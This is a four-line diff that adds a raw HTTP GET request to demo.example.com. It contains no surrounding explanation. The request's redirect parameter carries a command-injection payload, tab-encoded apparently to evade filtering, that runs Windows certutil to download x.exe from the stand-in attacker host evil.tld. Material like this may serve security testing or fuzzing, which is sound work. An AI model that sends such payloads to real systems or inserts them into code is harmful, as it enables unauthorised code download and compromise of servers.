@@ -1,0 +1,4 @@
+GET /a?redirect=;%09certutil%09-urlcache%09-f%09http://evil.tld/x.exe%09x.exe HTTP/1.1
+Host: demo.example.com
+Connection: close
+
